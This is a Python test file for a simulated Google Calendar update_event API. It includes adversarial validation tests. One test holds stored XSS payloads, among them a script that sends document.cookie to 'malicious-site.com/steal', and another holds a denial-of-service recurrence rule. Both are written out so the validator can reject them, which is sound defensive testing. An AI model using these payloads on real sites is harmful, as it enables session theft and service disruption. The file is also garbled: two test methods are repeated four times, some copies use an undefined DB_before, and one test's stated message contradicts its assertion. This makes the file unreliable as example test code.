# APIs/google_calendar/tests/test_update_event.py

import copy
from common_utils.base_case import BaseTestCaseWithErrorHandler
from ..SimulationEngine.db import DB
from ..SimulationEngine.custom_errors import InvalidInputError
from .. import update_event

class TestUpdateEvent(BaseTestCaseWithErrorHandler):

    def setUp(self):
        # Taken from the Default DB
        DB['calendars'].clear()
        DB['calendar_list'].clear()
        DB['events'].clear()
        DB['calendars']['cal-1000'] = {
            "id": "cal-1000",
            "summary": "Work Calendar",
            "description": "Company-wide meetings and deadlines",
            "timeZone": "America/New_York", 
            "primary": True
            }
        DB['calendar_list']['cal-1000'] = {
            "id": "cal-1000",
            "summary": "Work Calendar",
            "description": "Company-wide meetings and deadlines",
            "timeZone": "America/New_York",
            "primary": True
            }
        DB['calendars']['cal-2000'] = {
            "id": "cal-2000",
            "summary": "Personal Calendar",
            "description": "My personal events and reminders",
            "timeZone": "America/Los_Angeles",
            "primary": False
            }
        DB['calendar_list']['cal-2000'] = {
            "id": "cal-2000",
            "summary": "Personal Calendar",
            "description": "My personal events and reminders",
            "timeZone": "America/Los_Angeles",
            "primary": False
            }
        DB['calendars']['cal-3000'] = {
            "id": "cal-3000",
            "summary": "Family Calendar",
            "description": "Shared events with family members",
            "timeZone": "America/Denver",
            "primary": False
            }
        DB['calendar_list']['cal-3000'] = {
            "id": "cal-3000",
            "summary": "Family Calendar",
            "description": "Shared events with family members",
            "timeZone": "America/Denver",
            "primary": False
            }
        DB['events']['cal-1000:event-100'] = {
            "id": "event-100",
            "summary": "Team Sync",
            "description": "Weekly sync meeting with the team",
            "start": {
                "dateTime": "2025-03-10T09:00:00",
                "offset": "-03:00",
                "timeZone": "America/Sao_Paulo"
            },
            "end": {
                "dateTime": "2025-03-10T09:30:00",
                "offset": "-03:00",
                "timeZone": "America/Sao_Paulo"
            },
            "attachments": [
                {
                "fileUrl": "https://www.rd.usda.gov/sites/default/files/pdf-sample_0.pdf"
                }
            ]
            }
        DB['events']['cal-1000:event-101'] = {
            "id": "event-101",
            "summary": "Project Kickoff",
            "description": "Kickoff meeting for the new project",
            "start": {
                "dateTime": "2025-03-11T10:00:00",
                "offset": "+00:00",
                "timeZone": "Europe/London"
            },
            "end": {
                "dateTime": "2025-03-11T11:00:00",
                "offset": "+00:00",
                "timeZone": "Europe/London"
            }
            }
        DB['events']['cal-2000:event-200'] = {
            "id": "event-200",
            "summary": "Dentist Appointment",
            "description": "Routine dental check-up",
            "start": {
                "dateTime": "2025-03-15T14:00:00",
                "offset": "+09:00",
                "timeZone": "America/Los_Angeles"
            },
            "end": {
                "dateTime": "2025-03-15T14:45:00",
                "offset": "+09:00",
                "timeZone": "America/Los_Angeles"
            }
            }
        DB['events']['cal-3000:event-300'] = {
            "id": "event-300",
            "summary": "Family Dinner",
            "description": "Dinner with cousins",
            "start": {
                "dateTime": "2025-03-18T18:00:00",
                "offset": "-03:00",
                "timeZone": "America/Denver"
            },
            "end": {
                "dateTime": "2025-03-18T20:00:00",
                "offset": "-03:00",
                "timeZone": "America/Denver"
            }
            }

    def test_adversarial_QA_4633(self):
        """ Attempts to update an event by passing an integer for the 'eventId' parameter, which is expected to be a string. """
        """ https://docs.google.com/spreadsheets/d/1hvtkbQUMr8LxFNWlU2n-f57V_GHsl9JiT9Eq1fpl7SI/edit?usp=sharing """
        eventId = 100
        calendarId = "cal-1000"
        resource = {"summary": "Type Confusion Test",
                    "start": {"dateTime": "2024-10-26T10:00:00Z",
                              "timeZone": "UTC"
                              },
                    "end": {"dateTime": "2024-10-26T11:00:00Z",
                            "timeZone": "UTC"
                            }
                    }
        expected_message = "eventId must be a string if provided."

        DB_before = copy.deepcopy(DB)
        self.assert_error_behavior(func_to_call=update_event,
                                   expected_exception_type=TypeError,
                                   expected_message=expected_message,
                                   calendarId=calendarId,
                                   eventId=eventId,
                                   resource=resource)
        DB_after = copy.deepcopy(DB)

        self.assertEqual(DB_before, DB_after)
    
    def test_adversarial_QA_4634(self):
        """ Provides a recurrence rule string that does not conform to the RRULE format, for example, by misspelling a required parameter like 'FREQ'. """
        """ https://docs.google.com/spreadsheets/d/1hvtkbQUMr8LxFNWlU2n-f57V_GHsl9JiT9Eq1fpl7SI/edit?usp=sharing """
        eventId = "event-200"
        calendarId = "cal-2000"
        resource = {"start": {"dateTime": "2024-11-15T09:00:00-05:00", "timeZone": "America/New_York"},
                    "end": {"dateTime": "2024-11-15T10:00:00-05:00", "timeZone": "America/New_York"},
                    "recurrence": ["RRULE:FRQ=WEEKLY;BYDAY=MO,WE"]
                    }
        expected_message = """1 validation error for EventResourceInputModel
recurrence
  Value error, Recurrence rule 0 must contain FREQ [type=value_error, input_value=['RRULE:FRQ=WEEKLY;BYDAY=MO,WE'], input_type=list]
    For further information visit https://errors.pydantic.dev/2.11/v/value_error"""

        DB_before = copy.deepcopy(DB)
        self.assert_error_behavior(func_to_call=update_event,
                                   expected_exception_type=InvalidInputError,
                                   expected_message=expected_message,
                                   calendarId=calendarId,
                                   eventId=eventId,
                                   resource=resource)
    
    def test_update_all_day_event_with_date_field_works(self):
        """
        Test that update_event handles all-day events (with 'date' field).
        Verifies local_to_UTC is NOT called for all-day events.
        """
        # Create an all-day event first
        DB['events']['cal-1000:all_day_1'] = {
            "id": "all_day_1",
            "summary": "All Day Event",
            "start": {"date": "2025-04-01"},
            "end": {"date": "2025-04-02"}
        }
        
        # Update the all-day event
        updated_event = update_event(
            eventId="all_day_1",
            calendarId="cal-1000",
            resource={
                "summary": "Updated All Day Event",
                "start": {"date": "2025-04-05"},
                "end": {"date": "2025-04-06"}
            }
        )
        
        # Should succeed without DateTimeValidationError
        self.assertEqual(updated_event["summary"], "Updated All Day Event")
        self.assertEqual(updated_event["start"]["date"], "2025-04-05")
        self.assertEqual(updated_event["end"]["date"], "2025-04-06")
        
        # Verify in DB
        db_event = DB["events"]["cal-1000:all_day_1"]
        self.assertEqual(db_event["start"]["date"], "2025-04-05")
    
    def test_update_switch_from_datetime_to_all_day(self):
        """Test updating a timed event to an all-day event."""
        # Update timed event to all-day
        updated_event = update_event(
            eventId="event-100",
            calendarId="cal-1000",
            resource={
                "summary": "Now All Day",
                "start": {"date": "2025-03-15"},
                "end": {"date": "2025-03-16"}
            }
        )
        
        # Should work
        self.assertEqual(updated_event["start"]["date"], "2025-03-15")
        
        db_event = DB["events"]["cal-1000:event-100"]
        self.assertEqual(db_event["start"]["date"], "2025-03-15")
        DB_after = copy.deepcopy(DB)

        self.assertEqual(DB_before, DB_after)
    
    def test_adversarial_QA_4635(self):
        """ Update event with mixed data types in 'attendees' array """
        """ https://docs.google.com/spreadsheets/d/1hvtkbQUMr8LxFNWlU2n-f57V_GHsl9JiT9Eq1fpl7SI/edit?usp=sharing """
        eventId = "event-301"
        calendarId = "cal-3000"
        resource = {"start": {"dateTime": "2024-12-25T18:00:00Z", "timeZone": "UTC"},
                    "end": {"dateTime": "2024-12-25T22:00:00Z", "timeZone": "UTC"},
                    "attendees": [{"email": "valid@example.com"}, "invalid-attendee@example.com"]
                    }
        expected_message = """1 validation error for EventResourceInputModel
attendees.1
  Input should be a valid dictionary or instance of AttendeeModel [type=model_type, input_value='invalid-attendee@example.com', input_type=str]
    For further information visit https://errors.pydantic.dev/2.11/v/model_type"""

        DB_before = copy.deepcopy(DB)
        self.assert_error_behavior(func_to_call=update_event,
                                   expected_exception_type=InvalidInputError,
                                   expected_message=expected_message,
                                   calendarId=calendarId,
                                   eventId=eventId,
                                   resource=resource)
    
    def test_update_all_day_event_with_date_field_works(self):
        """
        Test that update_event handles all-day events (with 'date' field).
        Verifies local_to_UTC is NOT called for all-day events.
        """
        # Create an all-day event first
        DB['events']['cal-1000:all_day_1'] = {
            "id": "all_day_1",
            "summary": "All Day Event",
            "start": {"date": "2025-04-01"},
            "end": {"date": "2025-04-02"}
        }
        
        # Update the all-day event
        updated_event = update_event(
            eventId="all_day_1",
            calendarId="cal-1000",
            resource={
                "summary": "Updated All Day Event",
                "start": {"date": "2025-04-05"},
                "end": {"date": "2025-04-06"}
            }
        )
        
        # Should succeed without DateTimeValidationError
        self.assertEqual(updated_event["summary"], "Updated All Day Event")
        self.assertEqual(updated_event["start"]["date"], "2025-04-05")
        self.assertEqual(updated_event["end"]["date"], "2025-04-06")
        
        # Verify in DB
        db_event = DB["events"]["cal-1000:all_day_1"]
        self.assertEqual(db_event["start"]["date"], "2025-04-05")
    
    def test_update_switch_from_datetime_to_all_day(self):
        """Test updating a timed event to an all-day event."""
        # Update timed event to all-day
        updated_event = update_event(
            eventId="event-100",
            calendarId="cal-1000",
            resource={
                "summary": "Now All Day",
                "start": {"date": "2025-03-15"},
                "end": {"date": "2025-03-16"}
            }
        )
        
        # Should work
        self.assertEqual(updated_event["start"]["date"], "2025-03-15")
        
        db_event = DB["events"]["cal-1000:event-100"]
        self.assertEqual(db_event["start"]["date"], "2025-03-15")
        DB_after = copy.deepcopy(DB)

        self.assertEqual(DB_before, DB_after)
    
    def test_adversarial_QA_4640(self):
        """ Stored Cross-Site Scripting (XSS) in Event Fields """
        """ https://docs.google.com/spreadsheets/d/1hvtkbQUMr8LxFNWlU2n-f57V_GHsl9JiT9Eq1fpl7SI/edit?usp=sharing """
        eventId = "event-300"
        calendarId = "cal-3000"
        resource = {"summary": "Review <img src=x onerror=alert('XSS1')>",
                    "description": "Project details here: <script>fetch('https://malicious-site.com/steal?c=' + document.cookie)</script>",
                    "location": "Boardroom <iframe src=\"javascript:alert('XSS2')\"></iframe>",
                    "start": {"dateTime": "2024-10-15T14:00:00Z"},
                    "end": {"dateTime": "2024-10-15T15:00:00Z"}}
        expected_message = """1 validation error for EventResourceInputModel
summary
  Value error, summary contains potentially malicious content that could lead to XSS attacks [type=value_error, input_value='Review <img src=x onerror=alert(\'XSS1\')>', input_type=str]
    For further information visit https://errors.pydantic.dev/2.11/v/value_error"""

        # Test that XSS validation works - should raise InvalidInputError
        with self.assertRaises(InvalidInputError) as context:
            update_event(calendarId=calendarId, eventId=eventId, resource=resource)
        
        # Check that the error message contains XSS validation information
        error_message = str(context.exception)
        self.assertIn("3 validation errors for EventResourceInputModel", error_message)
        self.assertIn("summary contains potentially malicious content", error_message)
    
    def test_adversarial_QA_4641(self):
        """ Denial of Service via Computationally Expensive Recurrence Rule """
        """ https://docs.google.com/spreadsheets/d/1hvtkbQUMr8LxFNWlU2n-f57V_GHsl9JiT9Eq1fpl7SI/edit?usp=sharing """
        eventId = "event-200"
        calendarId = "cal-2000"
        resource = {"summary": "Infinite Meeting", "start": {"dateTime": "2025-01-01T00:00:00Z", "timeZone": "UTC"}, "end": {"dateTime": "2025-01-01T00:00:01Z", "timeZone": "UTC"}, "recurrence": ["RRULE:FREQ=SECONDLY;UNTIL=99991231T235959Z"]}
        expected_message = """1 validation error for EventResourceInputModel
recurrence
  Value error, Recurrence rule 0 has invalid FREQ 'SECONDLY'. Must be one of: DAILY, HOURLY, MINUTELY, MONTHLY, WEEKLY, YEARLY [type=value_error, input_value=['RRULE:FREQ=SECONDLY;UNTIL=99991231T235959Z'], input_type=list]
    For further information visit https://errors.pydantic.dev/2.11/v/value_error"""
        self.assert_error_behavior(func_to_call=update_event,
                                   expected_exception_type=InvalidInputError,
                                   expected_message=expected_message,
                                   calendarId=calendarId,
                                   eventId=eventId,
                                   resource=resource)
    
    def test_update_all_day_event_with_date_field_works(self):
        """
        Test that update_event handles all-day events (with 'date' field).
        Verifies local_to_UTC is NOT called for all-day events.
        """
        # Create an all-day event first
        DB['events']['cal-1000:all_day_1'] = {
            "id": "all_day_1",
            "summary": "All Day Event",
            "start": {"date": "2025-04-01"},
            "end": {"date": "2025-04-02"}
        }
        
        # Update the all-day event
        updated_event = update_event(
            eventId="all_day_1",
            calendarId="cal-1000",
            resource={
                "summary": "Updated All Day Event",
                "start": {"date": "2025-04-05"},
                "end": {"date": "2025-04-06"}
            }
        )
        
        # Should succeed without DateTimeValidationError
        self.assertEqual(updated_event["summary"], "Updated All Day Event")
        self.assertEqual(updated_event["start"]["date"], "2025-04-05")
        self.assertEqual(updated_event["end"]["date"], "2025-04-06")
        
        # Verify in DB
        db_event = DB["events"]["cal-1000:all_day_1"]
        self.assertEqual(db_event["start"]["date"], "2025-04-05")
    
    def test_update_switch_from_datetime_to_all_day(self):
        """Test updating a timed event to an all-day event."""
        # Update timed event to all-day
        updated_event = update_event(
            eventId="event-100",
            calendarId="cal-1000",
            resource={
                "summary": "Now All Day",
                "start": {"date": "2025-03-15"},
                "end": {"date": "2025-03-16"}
            }
        )
        
        # Should work
        self.assertEqual(updated_event["start"]["date"], "2025-03-15")
        
        db_event = DB["events"]["cal-1000:event-100"]
        self.assertEqual(db_event["start"]["date"], "2025-03-15")
    
    def test_adversarial_QA_4645(self):
        """ Update event with a logically invalid time range (end before start) """
        """ https://docs.google.com/spreadsheets/d/1hvtkbQUMr8LxFNWlU2n-f57V_GHsl9JiT9Eq1fpl7SI/edit?usp=sharing """
        eventId = "event-100"
        calendarId = "cal-1000"
        resource = {"summary": "Logical Time Error",
                    "start": {"dateTime": "2025-01-01T12:00:00Z", "timeZone": "UTC"},
                    "end": {"dateTime": "2025-01-01T10:00:00Z", "timeZone": "UTC"}}
        expected_message = "Start time must be before end time."

        self.assert_error_behavior(func_to_call=update_event,
                                   expected_exception_type=InvalidInputError,
                                   expected_message=expected_message,
                                   calendarId=calendarId,
                                   eventId=eventId,
                                   resource=resource)
    
    def test_update_all_day_event_with_date_field_works(self):
        """
        Test that update_event handles all-day events (with 'date' field).
        Verifies local_to_UTC is NOT called for all-day events.
        """
        # Create an all-day event first
        DB['events']['cal-1000:all_day_1'] = {
            "id": "all_day_1",
            "summary": "All Day Event",
            "start": {"date": "2025-04-01"},
            "end": {"date": "2025-04-02"}
        }
        
        # Update the all-day event
        updated_event = update_event(
            eventId="all_day_1",
            calendarId="cal-1000",
            resource={
                "summary": "Updated All Day Event",
                "start": {"date": "2025-04-05"},
                "end": {"date": "2025-04-06"}
            }
        )
        
        # Should succeed without DateTimeValidationError
        self.assertEqual(updated_event["summary"], "Updated All Day Event")
        self.assertEqual(updated_event["start"]["date"], "2025-04-05")
        self.assertEqual(updated_event["end"]["date"], "2025-04-06")
        
        # Verify in DB
        db_event = DB["events"]["cal-1000:all_day_1"]
        self.assertEqual(db_event["start"]["date"], "2025-04-05")
    
    def test_update_switch_from_datetime_to_all_day(self):
        """Test updating a timed event to an all-day event."""
        # Update timed event to all-day
        updated_event = update_event(
            eventId="event-100",
            calendarId="cal-1000",
            resource={
                "summary": "Now All Day",
                "start": {"date": "2025-03-15"},
                "end": {"date": "2025-03-16"}
            }
        )
        
        # Should work
        self.assertEqual(updated_event["start"]["date"], "2025-03-15")
        
        db_event = DB["events"]["cal-1000:event-100"]
        self.assertEqual(db_event["start"]["date"], "2025-03-15")
    
    def test_adversarial_QA_4646(self):
        """ Update event with a negative integer for 'additionalGuests' """
        """ https://docs.google.com/spreadsheets/d/1hvtkbQUMr8LxFNWlU2n-f57V_GHsl9JiT9Eq1fpl7SI/edit?usp=sharing """
        eventId = "event-101"
        calendarId = "cal-1000"
        resource = {"start": {"dateTime": "2024-10-27T10:00:00Z", "timeZone": "UTC"},
                    "end": {"dateTime": "2024-10-27T11:00:00Z", "timeZone": "UTC"},
                    "attendees": [{"email": "test@example.com", "additionalGuests": -10}]}
        expected_message = """1 validation error for EventResourceInputModel
attendees.0.additionalGuests
  Value error, Additional guests must be a non-negative integer. [type=value_error, input_value=-10, input_type=int]
    For further information visit https://errors.pydantic.dev/2.11/v/value_error"""

        self.assert_error_behavior(func_to_call=update_event,
                                   expected_exception_type=InvalidInputError,
                                   expected_message=expected_message,
                                   calendarId=calendarId,
                                   eventId=eventId,
                                   resource=resource)
    
    def test_update_all_day_event_with_date_field_works(self):
        """
        Test that update_event handles all-day events (with 'date' field).
        Verifies local_to_UTC is NOT called for all-day events.
        """
        # Create an all-day event first
        DB['events']['cal-1000:all_day_1'] = {
            "id": "all_day_1",
            "summary": "All Day Event",
            "start": {"date": "2025-04-01"},
            "end": {"date": "2025-04-02"}
        }
        
        # Update the all-day event
        updated_event = update_event(
            eventId="all_day_1",
            calendarId="cal-1000",
            resource={
                "summary": "Updated All Day Event",
                "start": {"date": "2025-04-05"},
                "end": {"date": "2025-04-06"}
            }
        )
        
        # Should succeed without DateTimeValidationError
        self.assertEqual(updated_event["summary"], "Updated All Day Event")
        self.assertEqual(updated_event["start"]["date"], "2025-04-05")
        self.assertEqual(updated_event["end"]["date"], "2025-04-06")
        
        # Verify in DB
        db_event = DB["events"]["cal-1000:all_day_1"]
        self.assertEqual(db_event["start"]["date"], "2025-04-05")
    
    def test_update_switch_from_datetime_to_all_day(self):
        """Test updating a timed event to an all-day event."""
        # Update timed event to all-day
        updated_event = update_event(
            eventId="event-100",
            calendarId="cal-1000",
            resource={
                "summary": "Now All Day",
                "start": {"date": "2025-03-15"},
                "end": {"date": "2025-03-16"}
            }
        )
        
        # Should work
        self.assertEqual(updated_event["start"]["date"], "2025-03-15")
        
        db_event = DB["events"]["cal-1000:event-100"]
        self.assertEqual(db_event["start"]["date"], "2025-03-15")
    
    def test_update_event_with_primary_calendar(self):
        """ Update event with primary calendar (Bug 1026) """
        eventId = "event-100"
        calendarId = "primary"
        resource = {"summary": "Primary Calendar Test",
                    "start": {"dateTime": "2025-01-01T12:00:00Z"},
                    "end": {"dateTime": "2025-01-01T13:00:00Z"}}

        result = update_event(calendarId=calendarId, eventId=eventId, resource=resource)
        
        self.assertIn("cal-1000:event-100", DB['events'])
        self.assertEqual(result["id"], "event-100")
        self.assertEqual(result["summary"], "Primary Calendar Test")
        self.assertEqual(result["start"]["dateTime"], "2025-01-01T12:00:00+00:00")
        self.assertEqual(result["end"]["dateTime"], "2025-01-01T13:00:00+00:00")
    
    def test_update_event_with_no_calendar_id_defaults_to_the_primary_calendar(self):
        """ Update event with no calendar id defaults to the primary calendar (Bug 1026) """
        eventId = "event-100"
        resource = {"summary": "Primary Calendar Test",
                    "start": {"dateTime": "2025-01-01T12:00:00+00:00"},
                    "end": {"dateTime": "2025-01-01T13:00:00+00:00"}}

        result = update_event(eventId=eventId, resource=resource)
        
        self.assertIn("cal-1000:event-100", DB['events'])
        self.assertEqual(result["id"], "event-100")
        self.assertEqual(result["summary"], "Primary Calendar Test")
        self.assertEqual(result["start"]["dateTime"], "2025-01-01T12:00:00+00:00")
        self.assertEqual(result["end"]["dateTime"], "2025-01-01T13:00:00+00:00")
